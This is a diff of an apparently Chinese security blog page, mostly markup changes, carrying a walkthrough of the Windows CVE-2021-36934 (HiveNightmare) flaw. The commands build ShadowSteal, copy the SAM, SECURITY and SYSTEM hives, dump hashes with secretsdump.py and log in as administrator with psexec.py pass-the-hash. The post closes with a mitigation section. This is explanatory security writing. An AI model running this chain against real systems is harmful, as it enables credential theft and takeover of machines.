@@ -437,7 +437,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    796
+                    806
                 </div>
                 
 
@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -470,7 +473,8 @@
 <p>根据微软的介绍，出现本地提权漏洞是由于多个系统文件（包括安全账户管理器数据库SAM）过度许可访问控制列表所导致。</p>
 <p>目前 POC 和 EXP 已经被公开，利用公开的 POC 可以低权限账号读取 SAM 等文件。</p>
 <h1 id="0x01-检查是否易受攻击"><a href="#0x01-检查是否易受攻击" class="headerlink" title="0x01 检查是否易受攻击"></a>0x01 检查是否易受攻击</h1><p>执行以下命令：</p>
-<pre><code>icacls C:\windows\system32\config\sam</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">icacls C:\windows\system32\config\sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>如果输出 BUILTIN\Users:(I)(RX) 表示该系统易受攻击。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723110132.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>如果输出 Access is denied 或拒绝访问表示该系统不易受攻击。</p>
@@ -482,21 +486,24 @@
 <p>可以看到在低权限账号下，成功利用 CVE-2021–36934 读取到了 SAM、SECURITY、SYSTEM 三个文件。</p>
 <p>除了 HiveNightmare 项目外，ShadowSteal 项目也能实现同样的效果，不过该项目需要编译使用，编译步骤如下：</p>
 <p>在 Linux 下运行以下命令，以 Kali 为例。</p>
-<pre><code>sudo apt-get install nim
+<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install nim
 nimble install zippy argparse
 nimble install winim
 sudo apt-get install mingw-w64
-git clone https://github.com/HuskyHacks/ShadowSteal.git &amp;&amp; cd ShadowSteal
-make &amp;&amp; cd bin/ &amp;&amp; ls -l</code></pre>
+git clone https:&#x2F;&#x2F;github.com&#x2F;HuskyHacks&#x2F;ShadowSteal.git &amp;&amp; cd ShadowSteal
+make &amp;&amp; cd bin&#x2F; &amp;&amp; ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>将编译好的 ShadowSteal.exe 放到目标系统上直接执行即可。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723141315.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>在获得  SAM、SECURITY、SYSTEM 文件后，我们就可以使用 secretsdump.py 获取目标用户的 hash 了。</p>
-<pre><code>git clone https://github.com/SecureAuthCorp/impacket.git
-cd impacket/examples
-python3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security SECURITY-2021-06-17 LOCAL</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.git
+cd impacket&#x2F;examples
+python3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security SECURITY-2021-06-17 LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723144111.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>再使用 psexec.py 直接利用 administrator 的 hash 登录管理员账户，获得 SYSTEM 权限会话。</p>
-<pre><code>python3 psexec.py -hashes xxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxx administrator@172.16.214.10 cmd.exe</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python3 psexec.py -hashes xxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxx administrator@172.16.214.10 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723155856.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>微软目前仍在研究该漏洞（编号为CVE-2021-36934），还未发布补丁更新。不过微软提供了一个临时性的解决方案。</p>
 <p>1、限制对 %windir%\system32\config 内容的访问</p>
@@ -938,7 +945,7 @@ python3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security S
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
